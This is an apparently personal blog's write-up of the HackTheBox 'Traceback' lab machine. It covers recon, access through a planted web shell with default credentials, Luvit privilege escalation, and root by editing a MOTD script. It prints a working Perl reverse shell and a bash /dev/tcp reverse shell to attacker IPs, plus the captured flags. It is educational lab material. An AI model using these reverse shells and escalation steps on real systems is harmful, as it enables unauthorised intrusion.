@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>HackTheBox Traceback Write Up w/o Metasploit :: Ajdin Trejić — Ajdin&#39;s blog about stuff</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access. If you have any questions you can find me on twitter @ajdintrejic.
+Reconnaissance Let’s run a quick nmap and full nmap scan in background:
+#top 1000 ports sudo nmap -sV -sC -O -oA nmap/initial 10."/>
+<meta name="keywords" content="Infosec, information security, cybersecurity, security, web development, webdev"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/posts/htb/traceback/" />
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.min.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox Traceback Write Up w/o Metasploit"/>
+<meta name="twitter:description" content="Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access."/>
+
+
+
+<meta property="og:title" content="HackTheBox Traceback Write Up w/o Metasploit" />
+<meta property="og:description" content="Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/htb/traceback/" />
+<meta property="article:published_time" content="2020-08-18T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-08-18T00:00:00+00:00" /><meta property="og:site_name" content="Ajdin Trejić" />
+
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/categories/hackthebox">HTB</a></li>
+        
+      
+        
+          <li><a href="/cv">CV</a></li>
+        
+      
+        
+          <li><a href="/archive">Archive</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/categories/hackthebox">HTB</a></li>
+      
+    
+      
+        <li><a href="/cv">CV</a></li>
+      
+    
+      
+        <li><a href="/archive">Archive</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+<div class="padding">
+<div id="cookies-eu-banner" class="post" style="display: none;">
+    By continuing to visit this site, you accept the use of cookies for statistical purposes.
+    <a href="/privacy" id="cookies-eu-more">Read more</a>
+    
+	<div class="flex">
+    <button class="button" id="cookies-eu-accept">Accept</button>
+    </div>
+</div>
+</div>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/posts/htb/traceback/">HackTheBox Traceback Write Up w/o Metasploit</a></h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-08-18
+        </span>
+
+        
+          
+        
+      
+
+      
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/smevk.php/">smevk.php</a>&nbsp;
+        
+          #<a href="/tags/ssh/">ssh</a>&nbsp;
+        
+          #<a href="/tags/moth/">moth</a>&nbsp;
+        
+          #<a href="/tags/luvit/">luvit</a>&nbsp;
+        
+          #<a href="/tags/lua/">lua</a>&nbsp;
+        
+          #<a href="/tags/suid/">suid</a>&nbsp;
+        
+      </span>
+    
+
+    
+      <figure class="post-cover">
+        
+          <img src="/htb/traceback/cover.jpg" alt="HackTheBox Traceback Write Up w/o Metasploit" />
+        
+
+        
+      </figure>
+    
+
+    <div class="post-content">
+      
+        <h2>Table of Contents</h2>
+        <aside class="table-of-contents"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#getting-user">Getting user</a>
+      <ul>
+        <li><a href="#smevkphp">Smevk.php</a></li>
+        <li><a href="#ssh-keygen">ssh-keygen</a></li>
+        <li><a href="#enumeration">Enumeration</a></li>
+        <li><a href="#luvit-privilege-escalation">Luvit privilege escalation</a></li>
+      </ul>
+    </li>
+    <li><a href="#getting-root">Getting Root</a></li>
+  </ul>
+</nav></aside>
+      
+      <p>Traceback is an easy Linux box created by Xh4H. You have to enter a shell planted on the server, enter as webadmin, escalate privileges with lua/luvit to sysadmin and echo a reverse shell in 00-header file to get root access. If you have any questions you can find me on twitter @ajdintrejic.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Let’s run a quick nmap and full nmap scan in background:</p>
+<pre><code>#top 1000 ports
+sudo nmap -sV -sC -O -oA nmap/initial 10.10.10.181
+
+#all ports
+sudo nmap -p- -sV -sC -O -oA nmap/full 10.10.10.181  
+</code></pre><ul>
+<li>-sC: run default script scan</li>
+<li>-sV: probe open ports to determine service/version info</li>
+<li>-O: OS detection</li>
+<li>-oA: output OS detection, version detection, script scanning, and traceroute</li>
+<li>-p-: run on all ports</li>
+</ul>
+
+  <img src="/htb/traceback/nmap.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We have a web page on port 80:</p>
+
+  <img src="/htb/traceback/port80.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>There is no <code>robots.txt</code> , but there is a comment that might be useful.</p>
+
+  <img src="/htb/traceback/comment.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I’ll also ran gobuster:</p>
+<pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.181 -x php,html -t 100
+</code></pre><p>But before it was finished I found out the next step. It also had a lot of errors (due to having a bad connection). So I won’t paste it here as it’s not important.</p>
+<h2 id="getting-user">Getting user</h2>
+<p>We can assume the hacker left in a shell by that comment. We can google that comment and find a repo containing some web shells.</p>
+
+  <img src="/htb/traceback/gitrepo.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I tried opening all off then on 10.10.10.181/&lt;shell.php&gt; , I only got a login prompt for smevk.php.</p>
+<h3 id="smevkphp">Smevk.php</h3>
+
+  <img src="/htb/traceback/smevk.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Let&rsquo;s open that</p>
+
+  <img src="/htb/traceback/smevk2.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I got in with <code>admin:admin</code>.</p>
+
+  <img src="/htb/traceback/smevk3.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We have entered the system and we are webadmin now,</p>
+
+  <img src="/htb/traceback/smevk4.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>now we should try to get a reverse shell so we can try to escalate privileges to user.</p>
+<h4 id="reverse-shell-as-webadmin">Reverse shell as webadmin</h4>
+<p>I couldn’t get it to work with nc but I did it with a perl reverse script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a>.</p>
+<p>Start a nc listener for reverse shell on your local machine (I used port 1233) with:</p>
+<pre><code>sudo nc -lvnp 1233 
+</code></pre>
+  <img src="/htb/traceback/nc.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>On backdoor webpage execute the payload but make sure to edit the IP and port.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">perl <span style="color:#f92672">-</span>e <span style="color:#e6db74">&#39;use Socket;
+</span><span style="color:#e6db74">$i=&#34;10.10.15.209&#34;;
+</span><span style="color:#e6db74">$p=1233;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));
+</span><span style="color:#e6db74">if(connect(S,sockaddr_in($p,inet_aton($i)))){
+</span><span style="color:#e6db74">	open(STDIN,&#34;&gt;&amp;S&#34;);
+</span><span style="color:#e6db74">	open(STDOUT,&#34;&gt;&amp;S&#34;);
+</span><span style="color:#e6db74">	open(STDERR,&#34;&gt;&amp;S&#34;);
+</span><span style="color:#e6db74">	exec(&#34;/bin/sh -i&#34;);
+</span><span style="color:#e6db74">};&#39;</span>
+</code></pre></div>
+  <img src="/htb/traceback/nc2.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>After executing that command we will get a sh shell as webmin:</p>
+
+  <img src="/htb/traceback/nc3.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>We can cat /etc/passwd and see that we have to get into the sysadmin account.</p>
+<pre><code>sysadmin:x:1001:1001::/home/sysadmin:/bin/sh
+</code></pre><h3 id="ssh-keygen">ssh-keygen</h3>
+<p>Let’s create out ssh keys while we’re here.</p>
+<pre><code>$ ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/webadmin/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/webadmin/.ssh/id_rsa.
+Your public key has been saved in /home/webadmin/.ssh/id_rsa.pub.
+The key fingerprint is:
+SHA256:Yt9f+khAXW3DKXb83bieDKCgScOpwFjMwx7+uiZYZBY webadmin@traceback
+The key's randomart image is:
++---[RSA 2048]----+
+| +            +..|
+|  E        . + *o|
+|o+ = .    . o oo=|
+|o.* = .  ..   . +|
+| = + +o.S...   . |
+|  o +. o.. .. .  |
+|.. .    . . .+.. |
+|o o        o ++  |
+| o..        +..  |
++----[SHA256]-----+
+</code></pre><p>Copy the private key id_rsa to your machine and add the public key id_rsa.pub into authorized keys with</p>
+<pre><code>echo &quot;\n\n&quot; &gt;&gt; authorized_keys
+cat id_rsa.pub &gt;&gt; authorized_keys
+</code></pre><p>We can ssh into the box now.</p>
+
+  <img src="/htb/traceback/nc4.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<h3 id="enumeration">Enumeration</h3>
+<p>Grab linPEAS.sh and LinEnum.sh and create a new folder with an http server running, on your local machine.</p>
+
+  <img src="/htb/traceback/python.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>After this we can grab the files and run them on the server. I created a /tmp/ajdin and pulled these files with wget :</p>
+<pre><code>wget http://10.10.15.209:1232/LinEnum.sh
+wget http://10.10.15.209:1232/linpeas.sh
+</code></pre><p>Looking at the output of linpeas.sh I’ve found 3 things:</p>
+<ul>
+<li>We have a file /home/webadmin/note.txt</li>
+<li>If we can get sysadmin account we can probably escalate privileges to root with files/scripts found in /etc/update-motd.d/</li>
+<li>We have a SUID binary /home/sysadmin/luvit which we can run as webadmin</li>
+</ul>
+<p>We can check out the note first:</p>
+<pre><code>$ cat /home/webadmin/note.txt
+- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+</code></pre><p>Okay, let’s remember lua, and carry on. The /etc/update-motd.d/ dir contains a script file 00-header</p>
+<pre><code>$ cat 00-header
+&lt;removed, not important&gt;[ -r /etc/lsb-release ] &amp;&amp; . /etc/lsb-release
+echo &quot;\nWelcome to Xh4H land \n&quot;
+</code></pre><p>but wait we’ve seen this text before, when we ssh’d into the box.</p>
+
+  <img src="/htb/traceback/ssh.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>So can we get code execution here as root? Let’s first get sysadmin account so we can write to this file. We are left with SUID binary which has no entry in GTFOBin, but we can Google and see what it does.</p>
+<h3 id="luvit-privilege-escalation">Luvit privilege escalation</h3>
+
+  <img src="/htb/traceback/luvit.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Wait so it has to do something with lua? If we check lua on GTFOBin, we can spawn a shell and escalate privileges:</p>
+<pre><code>lua -e 'os.execute(&quot;/bin/sh&quot;)'
+</code></pre><p>but we have luvit so let’s try</p>
+<pre><code>$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute(&quot;/bin/sh&quot;)'
+sh: turning off NDELAY mode
+whoami
+sysadmin
+</code></pre><p>We can now get the flag and continue:</p>
+<pre><code>cat user.txt
+addd2ba938b3b4bf2e15374f413aee04
+</code></pre><h2 id="getting-root">Getting Root</h2>
+<p>Amazing. Now let’s get back to that /etc/upadate-motd.d/ dir as sysadmin and try to get code execution as root:</p>
+<pre><code>$ echo “whoami” &gt;&gt; 00-header
+</code></pre>
+  <img src="/htb/traceback/root.png"  alt="nmap scan"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>For some reason you can’t make your ssh keys for this user. Anyway, we’ll insert the reverse shell bash payload into the 00-header .</p>
+<p>First start netcat listener on port 1250 nc -lvnp 1250 . Now insert the reverse shell payload:</p>
+<pre><code>echo &quot;/bin/bash -c '/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.136/1250 0&gt;&amp;1'&quot; &gt;&gt; 00-header
+</code></pre><p>And log back in. Now our netcat listener has a shell.</p>
+<pre><code>root@traceback:/# cat /root/root.txt
+2218cd7369604176712a79ad09dd5414
+</code></pre><p>Thanks for reading. If you have any questions feel free to reach out to me on Twitter @ajdintrejic.</p>
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+            
+              <span class="button next">
+                <a href="/posts/csrf-bypass-token-with-xss/">
+                  <span class="button__text">CSRF Token Extraction</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ajdin.io</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+
+        <span>© 2020  <a href="https://twitter.com/ajdintrejic" target="_blank" rel="noopener">Ajdin Trejić</a></span>
+	<span>&nbsp;<a href="/privacy" target="_blank" rel="noopener">Privacy</a>&nbsp;</span>
+        <span>&nbsp;<a href="/archive" target="_blank" rel="noopener">Archive</a>&nbsp;</span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script src="/js/menu.js"></script>
+<script src="/js/theme.js"></script>
+<script src="/js/prism.js"></script>
+
+
+<script src="/cookies-eu-banner.js"></script>
+<script>
+    console.log("hello")
+    new CookiesEuBanner(function () {
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        
+        ga('create', 'UA-165836726-1', 'auto');
+        ga('send', 'pageview');
+    });
+</script>
+
+
+
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
